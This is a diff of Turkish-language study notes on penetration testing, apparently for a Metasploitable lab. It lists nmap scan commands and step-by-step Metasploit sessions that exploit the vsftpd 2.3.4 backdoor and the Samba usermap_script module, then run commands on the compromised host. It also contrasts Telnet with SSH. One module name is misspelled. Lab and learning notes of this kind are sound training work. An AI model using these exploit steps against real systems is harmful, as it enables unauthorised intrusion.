@@ -66,16 +66,56 @@ nmap → temel
 -sC → script
 -A → hepsi
 
-**_Sunucu-Bilgisyar Hackleme_**
+**_Sunucu-Bilgisayar Hackleme_**
 
-~nmap -v -sS -A -T4 taget //sonuçlar kaydedilip açık portlarla sızma denemeleri yapılır.Metasploitable a
+- porları exploitdb/rapid7 sitelerinden açık var mı bak
 
-- Açık portlar sızma için başlangıç noktasıdır, ama başarı: Servis zafiyetine bağlıdır
+* portlar değil servisler hacklenir
+  ~nmap -v -sS -A -T4 target //sonuçlar kaydedilip açık portlarla sızma denemeleri yapılır.Metasploitable a
 
-- İlk test 21 portu ftp açık portunda version kısmını cp yap "vsftpd 2.3.4" yanına exploit yazıp arat. rapid7 da hacklemek için oluşturulmu modüller var.
+* Açık portlar sızma testleri için başlangıç noktasıdır; ancak başarı, ilgili serviste bir zafiyet bulunmasına bağlıdır.
 
-- Metasploit Console -
+* İlk test 21 portu ftp açık portunda version kısmını cp yap "vsftpd 2.3.4" yanına exploit yazıp arat. rapid7 da hackleme/test için oluşturulmuş modüller
+
+1. -- FTP ile Hacklemek -- port21
+
+~msfconsole //Metasploit Console giriş yapılır
+msf6> ~use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show options
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~set target 0
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)>set rhosts 10.0.2.5
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show options //bu sefer hedef çıkar
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show targets //hedefleri gösterir
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~exploit -j -z //exploit çalıştırılır (başarı zafiyete bağlıdır)
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions -l //açık olan bağlantıların listesi çıkar
+msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions 1
+
+~ls //çalıştır hacklenen bilgisayarın ls çıkarır
+~uname -a //içersinde olduğunuz linux hakkında bilgi verir. Hangi makinede olduğunu kurban/kendi gösterir
+
+2. -- Telnet vs SSH Hacklemek --port23-port22
+
+- SSH açık İstemci ↔ Sunucu arasındaki iletişim korur
+
+- Telnet şifreleme yok,zayıf,her şey okunabilir,şifreler ele eçirilebilir
+- SSH ağ trafiği şifreli,kimlik doğrular,veri gizliliği. Sunucular bunu kullanır. Telnet'in yerini aldı.
+
+* En güvenli telnet kapalı SSH açık, SSH hardening yapılmış
+
+3. -- SAMBA Hacklemek --
+
+- Samba, Linux / Unix sistemlerin Windows ağlarıyla konuşmasını sağlayan bir servistir.Linux ↔ Windows dosya paylaşımı,Yazıcı paylaşımı, Ağ üzerinden klasör erişimi..
+
+- nmap sonucundaki Samba smbd 3.X - 4.X cp ve exploitdb/rapid7 ten nasıl hackleneceğine bak
 
 ~msfconsole
-msf6> ~use exploit/unix/ftp/vsftpd_234_backdoor
-msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show targets
+msf6> use exploit/multi/samba/usermap_scrip
+msf6 exploit(multi/samba/usermap_scrip) > show options
+msf6 exploit(multi/samba/usermap_scrip) > set rhosts 10.0.2.5
+msf6 exploit(multi/samba/usermap_scrip) > show options //gözükmeli artık
+msf6 exploit(multi/samba/usermap_scrip) > exploit -j -z
+msf6 exploit(multi/samba/usermap_scrip) > sessions -l
+msf6 exploit(multi/samba/usermap_scrip) > sessions 1
+uname -a //hacklediğin servis mi bak
+ls
